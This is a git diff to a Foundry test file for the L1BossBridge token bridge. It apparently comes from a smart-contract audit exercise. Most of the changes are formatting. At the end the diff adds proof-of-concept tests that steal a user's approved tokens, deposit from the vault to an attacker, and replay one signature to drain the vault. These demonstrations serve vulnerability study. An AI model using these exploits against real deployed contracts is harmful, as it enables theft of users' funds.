@@ -1,14 +1,16 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.20;
 
-import { Test, console2 } from "forge-std/Test.sol";
-import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
-import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
-import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
-import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
-import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
-import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
-import { L1Token } from "../src/L1Token.sol";
+import {Test, console2} from "forge-std/Test.sol";
+import {ECDSA} from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+import {
+    MessageHashUtils
+} from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
+import {Ownable} from "openzeppelin/contracts/access/Ownable.sol";
+import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";
+import {L1BossBridge, L1Vault} from "../src/L1BossBridge.sol";
+import {IERC20} from "openzeppelin/contracts/interfaces/IERC20.sol";
+import {L1Token} from "../src/L1Token.sol";
 
 contract L1BossBridgeTest is Test {
     event Deposit(address from, address to, uint256 amount);
@@ -55,7 +57,10 @@ contract L1BossBridgeTest is Test {
     }
 
     function testVaultInfiniteAllowanceToBridge() public {
-        assertEq(token.allowance(address(vault), address(tokenBridge)), type(uint256).max);
+        assertEq(
+            token.allowance(address(vault), address(tokenBridge)),
+            type(uint256).max
+        );
     }
 
     function testOnlyOwnerCanPauseBridge() public {
@@ -65,7 +70,12 @@ contract L1BossBridgeTest is Test {
     }
 
     function testNonOwnerCannotPauseBridge() public {
-        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                Ownable.OwnableUnauthorizedAccount.selector,
+                address(this)
+            )
+        );
         tokenBridge.pause();
     }
 
@@ -84,7 +94,12 @@ contract L1BossBridgeTest is Test {
         tokenBridge.pause();
         assertTrue(tokenBridge.paused());
 
-        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                Ownable.OwnableUnauthorizedAccount.selector,
+                address(this)
+            )
+        );
         tokenBridge.unpause();
     }
 
@@ -93,7 +108,12 @@ contract L1BossBridgeTest is Test {
     }
 
     function testNonOwnerCannotAddSigner() public {
-        vm.expectRevert(abi.encodeWithSelector(Ownable.OwnableUnauthorizedAccount.selector, address(this)));
+        vm.expectRevert(
+            abi.encodeWithSelector(
+                Ownable.OwnableUnauthorizedAccount.selector,
+                address(this)
+            )
+        );
         tokenBridge.setSigner(operator.addr, true);
     }
 
@@ -130,7 +150,9 @@ contract L1BossBridgeTest is Test {
         deal(address(token), user, amount);
         token.approve(address(tokenBridge), amount);
 
-        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
+        vm.expectRevert(
+            L1BossBridge.L1BossBridge__DepositLimitReached.selector
+        );
         tokenBridge.depositTokensToL2(user, userInL2, amount);
         vm.stopPrank();
     }
@@ -144,9 +166,15 @@ contract L1BossBridgeTest is Test {
         tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
 
         assertEq(token.balanceOf(address(vault)), depositAmount);
-        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
+        assertEq(
+            token.balanceOf(address(user)),
+            userInitialBalance - depositAmount
+        );
 
-        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
+            _getTokenWithdrawalMessage(user, depositAmount),
+            operator.key
+        );
         tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
 
         assertEq(token.balanceOf(address(user)), userInitialBalance);
@@ -162,10 +190,15 @@ contract L1BossBridgeTest is Test {
         tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
 
         assertEq(token.balanceOf(address(vault)), depositAmount);
-        assertEq(token.balanceOf(address(user)), userInitialBalance - depositAmount);
+        assertEq(
+            token.balanceOf(address(user)),
+            userInitialBalance - depositAmount
+        );
 
-        (uint8 v, bytes32 r, bytes32 s) =
-            _signMessage(_getTokenWithdrawalMessage(user, depositAmount), makeAccount("unknownOperator").key);
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
+            _getTokenWithdrawalMessage(user, depositAmount),
+            makeAccount("unknownOperator").key
+        );
 
         vm.expectRevert(L1BossBridge.L1BossBridge__Unauthorized.selector);
         tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
@@ -192,7 +225,10 @@ contract L1BossBridgeTest is Test {
         token.approve(address(tokenBridge), depositAmount);
         tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
 
-        (uint8 v, bytes32 r, bytes32 s) = _signMessage(_getTokenWithdrawalMessage(user, depositAmount), operator.key);
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
+            _getTokenWithdrawalMessage(user, depositAmount),
+            operator.key
+        );
         vm.startPrank(tokenBridge.owner());
         tokenBridge.pause();
 
@@ -200,12 +236,19 @@ contract L1BossBridgeTest is Test {
         tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
     }
 
-    function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
-        return abi.encode(
-            address(token), // target
-            0, // value
-            abi.encodeCall(IERC20.transferFrom, (address(vault), recipient, amount)) // data
-        );
+    function _getTokenWithdrawalMessage(
+        address recipient,
+        uint256 amount
+    ) private view returns (bytes memory) {
+        return
+            abi.encode(
+                address(token), // target
+                0, // value
+                abi.encodeCall(
+                    IERC20.transferFrom,
+                    (address(vault), recipient, amount)
+                ) // data
+            );
     }
 
     /**
@@ -216,11 +259,94 @@ contract L1BossBridgeTest is Test {
     function _signMessage(
         bytes memory message,
         uint256 privateKey
-    )
-        private
-        pure
-        returns (uint8 v, bytes32 r, bytes32 s)
-    {
-        return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+    ) private pure returns (uint8 v, bytes32 r, bytes32 s) {
+        return
+            vm.sign(
+                privateKey,
+                MessageHashUtils.toEthSignedMessageHash(keccak256(message))
+            );
+    }
+    function testCanMoveApprovedTokensFromUsers() public {
+        // Alice (msg.sender)
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        // This is Bob (Attacker)
+        uint256 tokenAmount = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, tokenAmount);
+
+        tokenBridge.depositTokensToL2(user, attacker, tokenAmount);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), tokenAmount);
+
+        vm.stopPrank();
+    }
+
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+
+        uint256 vaultBalance = 500 ether;
+
+        deal(address(token), address(vault), vaultBalance);
+        vm.expectEmit(address(tokenBridge));
+
+        emit Deposit(address(vault), attacker, vaultBalance);
+
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+    }
+    function testSignatureReplay() public {
+        uint256 vaultInitialBalance = 1000e18;
+        uint256 attackerInitialBalance = 100e18;
+
+        address attacker = makeAddr("attacker");
+
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), address(attacker), attackerInitialBalance);
+
+        // attacker deposits tokens to L2
+
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(
+            attacker,
+            attacker,
+            attackerInitialBalance
+        );
+
+        // Signer now signing the withdrawal
+        bytes memory message = abi.encode(
+            address(token),
+            0,
+            abi.encodeCall(
+                IERC20.transferFrom,
+                (address(vault), attacker, attackerInitialBalance)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
+            operator.key,
+            MessageHashUtils.toEthSignedMessageHash(keccak256(message))
+        );
+
+        // attacker replaying the signature calls
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(
+                attacker,
+                attackerInitialBalance,
+                v,
+                r,
+                s
+            );
+        }
+
+        assertEq(
+            token.balanceOf(address(attacker)),
+            attackerInitialBalance + vaultInitialBalance
+        );
+
+        assertEq(token.balanceOf(address(vault)), 0);
     }
 }
